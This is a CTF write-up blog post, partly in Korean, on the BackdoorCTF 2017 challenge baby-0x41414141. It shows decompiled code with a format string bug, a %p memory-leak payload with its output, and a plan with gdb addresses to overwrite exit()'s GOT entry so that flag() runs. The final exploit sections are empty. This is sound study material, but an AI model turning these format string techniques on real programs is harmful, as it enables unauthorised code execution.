@@ -1,0 +1,158 @@
+---
+layout: post
+title: '[CTF] backdoor 2017 baby-0x41414141'
+date: '2017-10-04 13:00:00 +0900'
+categories: ctf
+tags: [fsb]
+---
+
+
+## A. Write-up
+
+[CTFtime.org / BackdoorCTF 2017 / baby-0x41414141](https://ctftime.org/task/4682)
+
+- [backdoor2017/Baby_0x41414141 at master · ShellCollectingClub/backdoor2017](https://github.com/ShellCollectingClub/backdoor2017/tree/master/Baby_0x41414141)
+
+
+## B. Basic info
+
+
+
+### 1. Code 
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+18h] [ebp-200h]
+  char format; // [esp+E0h] [ebp-138h]
+  unsigned int v5; // [esp+20Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  puts("Hello baby pwner, whats your name?");
+  fflush(stdout);
+  fgets(&s, 200, edata);
+  fflush(edata);
+
+  sprintf(&format, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", &s);
+  fflush(stdout);
+
+  printf(&format);  // FSB
+  fflush(stdout);
+
+  exit(1);
+}
+```
+
+
+### 2. Protection
+
+```
+gef)  checksec
+[+] checksec for '/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/ctf/2017/backdoor/baby_0x41414141/32_new'
+Canary                        : No
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+```
+
+
+### 3. Initial execution
+
+```bash
+$ ./32_new
+Hello baby pwner, whats your name?
+AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA,0x8048914,0xffb2da08,0x1,0xf744d618,0x36e,0xf7453668,0xffb2dcb4,0xffb2da54,0xffb2da50,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
+```
+
+
+
+## C. How to exploit
+
+Flag 찍어주는 함수가 있으므로  이 함수로 `eip` setting 하면 될 듯....
+
+```c
+int flag(void)
+{
+  return system("cat flag.txt");
+}
+```
+
+FSB write를 이용하여 `exit()` GOT 를 `flag()` overwrite 하면 될 듯.
+
+```c
+...
+  sprintf(&format, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", &s);
+  fflush(stdout);
+
+  printf(&format);  // FSB
+  fflush(stdout);
+
+  exit(1);
+}
+```
+
+
+
+## D. Exploit : FSB basic attack
+
+[BackdoorCTF 2017 - baby0x41414141 : TeamRocketIST - Portuguese CTF Team](https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/)
+
+`exit()` GOT 값을 `flag()` 함수 값으로 변경하여 프로그램 종료 시 `exit()` 시에 `flag()` 함수 호출되도록 exploit 하기.
+
+
+#### `exit()`
+
+PLT 는 `0x80485f0`, GOT는 `0x804a034`
+
+```
+gdb-peda$ x/10i 0x080485F0
+   0x80485f0 <exit@plt>:        jmp    DWORD PTR ds:0x804a034
+   0x80485f6 <exit@plt+6>:      push   0x50
+   0x80485fb <exit@plt+11>:     jmp    0x8048540
+   0x8048600:   jmp    DWORD PTR ds:0x8049ffc
+
+gdb-peda$ x/10i 0x804A034
+   0x804a034:   test   BYTE PTR [ebp+0x804],0x0
+   0x804a03b:   add    BYTE PTR [eax],al
+   0x804a03d:   add    BYTE PTR [eax],al
+   0x804a03f:   add    BYTE PTR [eax+0x60f7e305],ah
+```
+
+
+#### `flag()` 함수 
+
+```c
+gdb-peda$ x/10i 0x0804870B
+   0x804870b <_Z4flagv>:        push   ebp
+   0x804870c <_Z4flagv+1>:      mov    ebp,esp
+   0x804870e <_Z4flagv+3>:      sub    esp,0x8
+   0x8048711 <_Z4flagv+6>:      sub    esp,0xc
+   0x8048714 <_Z4flagv+9>:      push   0x80488e0
+   0x8048719 <_Z4flagv+14>:     call   0x8048570 <system@plt>
+   0x804871e <_Z4flagv+19>:     add    esp,0x10
+   0x8048721 <_Z4flagv+22>:     nop
+   0x8048722 <_Z4flagv+23>:     leave
+   0x8048723 <_Z4flagv+24>:     ret
+```
+
+
+
+
+
+
+
+## E. Exploit : `libformatstr` 사용 
+
+[hellman/libformatstr: Simplify format string exploitation.](https://github.com/hellman/libformatstr)
+
+
+
+
+
+
+
+
+
+
